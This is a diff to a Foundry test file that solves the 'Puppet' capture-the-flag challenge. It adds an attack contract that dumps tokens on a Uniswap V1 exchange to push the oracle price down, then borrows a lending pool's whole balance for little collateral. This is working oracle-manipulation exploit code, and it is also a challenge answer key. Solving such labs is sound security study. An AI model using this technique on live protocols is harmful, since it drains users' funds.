@@ -8,6 +8,35 @@ import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
 import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
 import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";
 
+contract AttackPuppet {
+    DamnValuableToken token;
+    PuppetPool pool;
+    IUniswapV1Exchange exchange;
+    address recovery;
+
+    constructor(DamnValuableToken _token, PuppetPool _pool, IUniswapV1Exchange _exchange, address _recovery) payable {
+        token = _token;
+        pool = _pool;
+        exchange = _exchange;
+        recovery = _recovery;
+    }
+
+    function start() public {
+        // 1. Dump DVT tokens to manipulate price
+        token.approve(address(exchange), token.balanceOf(address(this)));
+        exchange.tokenToEthTransferInput(
+            token.balanceOf(address(this)),
+            9e18, // Minimum 9 ETH expected back
+            block.timestamp,
+            address(this)
+        );
+        // 2. Borrow all tokens with minimal collateral
+        pool.borrow{value: 20e18}(token.balanceOf(address(pool)), recovery);
+    }
+
+    receive() external payable {}
+}
+
 contract PuppetChallenge is Test {
     address deployer = makeAddr("deployer");
     address recovery = makeAddr("recovery");
@@ -92,7 +121,9 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+        AttackPuppet attackPuppet = new AttackPuppet{value: 11e18}(token, lendingPool, uniswapV1Exchange, recovery);
+        token.transfer(address(attackPuppet), PLAYER_INITIAL_TOKEN_BALANCE);
+        attackPuppet.start();
     }
 
     // Utility function to calculate Uniswap prices
